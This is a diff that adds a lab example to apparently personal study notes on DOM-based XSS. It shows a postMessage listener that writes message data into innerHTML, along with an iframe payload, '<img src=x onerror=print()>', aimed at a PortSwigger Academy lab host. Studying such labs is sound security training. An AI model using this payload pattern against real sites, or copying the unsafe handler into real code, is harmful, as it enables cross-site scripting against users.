@@ -22,3 +22,35 @@ TODO: more details and examples
 
 
 **List of sinks**: https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities
+
+
+##### iframe messages example
+```js
+window.addEventListener('message', function(e) {
+	document.getElementById('ads').innerHTML = e.data;
+})
+```
+
+```html
+<iframe style="width: 1000px;height: 500px;" src="https://0a3f00cc04e03997843386a000f0009b.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print() />','*')" />
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
